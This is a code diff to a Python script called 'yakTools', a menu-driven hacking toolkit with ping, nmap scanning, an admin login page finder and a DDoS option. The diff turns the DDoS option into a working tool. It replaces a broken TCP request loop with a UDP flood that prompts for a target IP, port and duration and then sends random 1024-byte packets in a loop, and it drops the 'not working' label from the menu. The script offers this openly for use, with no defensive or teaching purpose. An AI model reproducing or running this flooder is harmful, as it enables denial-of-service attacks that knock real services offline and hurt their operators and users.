@@ -21,7 +21,7 @@ print("   | |   | )   ( || )      ")
 print("   \_/   |/     \||/       ")
 print("                           ")
 print("Welcome to yakTools v1.0")
-print("FOLLOW ME ON TWITTER @YakMasterFlash\n\n\n")
+print("FOLLOW ME ON TWITTER @Parses\n\n\n")
 def main_menu():
   print("Main Menu:")
   print("Please use option 1 first!\n")
@@ -29,7 +29,7 @@ def main_menu():
   print("[2] Ping")
   print("[3] Get IP Address")
   print("[4] Nmap Scan")
-  print("[5] DDoS - (USE ON A VPS!) [NOT WORKING RIGHT NOW!]")
+  print("[5] DDoS - (USE ON A VPS!)")
   print("[6] Administrator Login Page Finder")
   #print("[5] DDoS TOOL!")
   print("Type 'exit' to close.")
@@ -86,14 +86,24 @@ def nmap():
     main_menu()
 
 def ddos():
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-  s.connect(site)
-  print("Attacking....")  
-  s.send("GET /" + "80" + " HTTP/1.1\r\n")  
-  s.send("Host: " + site  + "\r\n\r\n");  
-  s.close()  
-  for i in range(1, 10000):  
-    ddos()
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  #create a UDP packet  
+  vic = input("Target IP: ")
+  port = input("Target Port (default 80): ")
+  dur = input("Length (in seconds): ") 
+  bytes = random._urandom(1024)
+  timeout = time.time() + float(dur)
+  sent = 0
+
+  while 1:
+    if time.time() > timeout:
+      break
+    else:
+      pass
+    s.sendto(bytes, (vic, int(port)))
+    sent = sent + 1
+    print("Attacking...")
+  main_menu()
 
 
 #--------------------------------------#
